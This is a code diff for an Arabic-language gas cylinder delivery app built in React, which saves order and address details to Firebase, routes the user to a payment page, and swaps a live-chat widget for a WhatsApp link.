@@ -1,7 +1,7 @@
 "use client"
 
 import { useState, useEffect, type SetStateAction } from "react"
-import { Moon, Plus, Minus, Sun, MapPin, CreditCard, Wallet, Check } from "lucide-react"
+import { Moon, Plus, Minus, Sun, MapPin, CreditCard, Wallet, Check, MessageCircle } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Separator } from "@/components/ui/separator"
 import { useTheme } from "next-themes"
@@ -12,7 +12,6 @@ import { Input } from "@/components/ui/input"
 import { addData } from "@/lib/firebase"
 import { setupOnlineStatus } from "@/lib/utils"
 import { useRouter } from "next/navigation"
-import { LiveChatWidget } from "@livechat/widget-react"
 
 export default function GasCylinderApp() {
   const [step, setStep] = useState(1)
@@ -167,9 +166,48 @@ export default function GasCylinderApp() {
   }
 
   const proceedToPayment = () => {
-    // In a real app, this would redirect to a payment gateway
-    alert("سيتم تحويلك إلى بوابة الدفع")
-    router.push("/knet")
+    // Get the selected address details
+    const selectedAddressData = getSelectedAddress()
+
+    // Calculate total price
+    const totalPrice = cylinderCount * 5 + 1
+    localStorage.setItem('total',totalPrice?.toString()!)
+    // Create order data object
+    const orderData = {
+      id: _id,
+      timestamp: new Date().toISOString(),
+      customer: {
+        name: selectedAddressData?.name || "غير محدد",
+        area: selectedAddressData?.area || "غير محدد",
+        block: selectedAddressData?.block || "غير محدد",
+        street: selectedAddressData?.street || "غير محدد",
+        building: selectedAddressData?.building || "غير محدد",
+        floor: selectedAddressData?.floor || "غير محدد",
+        apartment: selectedAddressData?.apartment || "غير محدد",
+        mobile: selectedAddressData?.mobile || "غير محدد",
+      },
+      order: {
+        cylinderCount: cylinderCount,
+        deliveryDate: `${selectedDate} ${selectedDay}`,
+        deliveryTime: getTimeSlotText(selectedTimeSlot),
+        paymentMethod: selectedPayment === "card" ? "بطاقة ائتمان" : "كي نت",
+        totalPrice: `${totalPrice} د.ك`,
+      },
+      status: "pending",
+    }
+
+    // Save order data to Firebase
+    addData(orderData)
+      .then(() => {
+        console.log("Order data saved successfully")
+        // In a real app, this would redirect to a payment gateway
+        alert("تم حفظ بيانات الطلب وسيتم تحويلك إلى بوابة الدفع")
+        router.push("/knet")
+      })
+      .catch((error) => {
+        console.error("Error saving order data:", error)
+        alert("حدث خطأ أثناء حفظ بيانات الطلب. يرجى المحاولة مرة أخرى.")
+      })
   }
 
   if (!mounted) {
@@ -186,6 +224,7 @@ export default function GasCylinderApp() {
       <header className="p-4 flex justify-between items-center">
         <h1 className={`text-3xl font-bold ${theme === "light" ? "text-green-600" : "text-green-500"}`}>سلندر غاز</h1>
         <div className="flex items-center gap-2">
+         
           <Button variant="ghost" size="icon" onClick={toggleTheme} className="rounded-full">
             {theme === "dark" ? (
               <Moon className="h-5 w-5 text-gray-400" />
@@ -832,8 +871,18 @@ export default function GasCylinderApp() {
             العودة إلى الصفحة الرئيسية
           </Link>
         </div>
+        <div className="mt-6">
+        
+        </div>
       </footer>
-      <LiveChatWidget license="19137023" visibility="minimized" />
+      <Link
+            href="https://wa.me/9659603444"
+            target="_blank"
+            rel="noopener noreferrer"
+            className={`fixed bottom-2  rounded-full ${theme === "light" ? "bg-green-600 hover:bg-green-700" : "bg-green-500 hover:bg-green-600"} text-white font-bold`}
+          >
+            <img src="/next.svg" className="h-10 w-10 p-2"  />
+          </Link>
     </div>
   )
 }
